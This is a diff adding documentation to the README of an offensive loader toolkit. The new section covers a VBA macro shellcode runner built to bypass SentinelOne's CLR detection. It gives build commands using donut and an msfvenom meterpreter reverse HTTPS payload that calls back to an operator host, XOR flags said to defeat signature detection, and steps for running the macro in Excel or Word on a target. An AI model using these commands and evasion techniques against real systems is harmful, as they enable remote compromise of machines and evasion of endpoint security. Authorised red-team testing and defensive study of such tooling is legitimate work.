@@ -56,6 +56,7 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 | `vbscript_payload.vbs` | VBScript loader — CLR COM hosting via CorRuntimeHost, runs under cscript.exe |
 | `hta_payload.hta` | HTA loader — same VBScript technique in mshta.exe, auto-hides window |
 | `vba_payload.bas` | VBA macro — CLR COM hosting from Excel/Word, bypasses CLM+WSH+cmd restrictions |
+| `vba_shellcode.bas` | VBA shellcode runner — Win32 API injection, works with donut and raw shellcode |
 
 ### Tooling
 
@@ -71,6 +72,7 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 | `build_vbscript.py` | One-command build: encrypts assembly and injects into VBScript loader |
 | `build_hta.py` | One-command build: encrypts assembly and injects into HTA loader |
 | `build_vba.py` | One-command build: encrypts assembly and injects into VBA macro module |
+| `build_vba_shellcode.py` | One-command build: injects raw shellcode into VBA shellcode runner |
 | `encrypt_payload.py` | XOR/AES encryptor — outputs C# byte arrays, raw binary, or hex |
 | `pipe_client.py` | Operator-side named pipe client for sending assemblies to the pipe listener |
 
@@ -311,6 +313,45 @@ python build_vba.py Seatbelt.exe -e xor -- -group=all
 #   3. File > Import File > payload_ready.bas
 #   4. F5 to run
 ```
+
+### VBA Shellcode Runner (Win32 API — bypasses S1 CLR detection)
+
+Executes raw shellcode via Win32 API calls from VBA. No CLR hosting needed — bypasses
+SentinelOne's CLR COM detection that blocks `CreateObject("mscoree.CorRuntimeHost")`.
+Uses RW→RX memory staging (never RWX) and CreateThread for execution.
+
+Works with donut-generated shellcode (.NET assemblies converted to shellcode) and native
+shellcode (msfvenom, Cobalt Strike, etc.).
+
+```bash
+# .NET assembly via donut (build donut on x86_64 Linux)
+donut -i Seatbelt.exe -a 2 -b 3 -x 3 -p "-group=user" -o seatbelt.bin
+python build_vba_shellcode.py seatbelt.bin --no-wait
+
+# With XOR encryption layer
+python build_vba_shellcode.py seatbelt.bin --no-wait --xor
+
+# Native shellcode (no donut needed)
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 -f raw -o msf.bin
+python build_vba_shellcode.py msf.bin --no-wait --xor
+
+# On target:
+#   1. Open Excel or Word
+#   2. Alt+F11 → VBA editor
+#   3. File > Import File > payload_ready.bas
+#   4. F5 to run Auto_Open
+```
+
+**Key flags:**
+- `--no-wait` — required for donut `-x 3` (block) shellcode. Fire-and-forget, don't wait for thread.
+- `--xor` — XOR encrypt shellcode (prevents static signature detection). Random key by default.
+- `--xor-key <hex>` — specify XOR key.
+
+**Donut notes:**
+- Must use `-x 3` (block, not exit) — `-x 1` (exit thread) kills Excel
+- Must use `-a 2` (amd64) for 64-bit Office
+- Build donut from source on x86_64 Linux (won't compile on macOS ARM)
+- go-donut works on macOS but arg parser breaks on `-p` values starting with `-`
 
 ### Supported Assembly Types
 
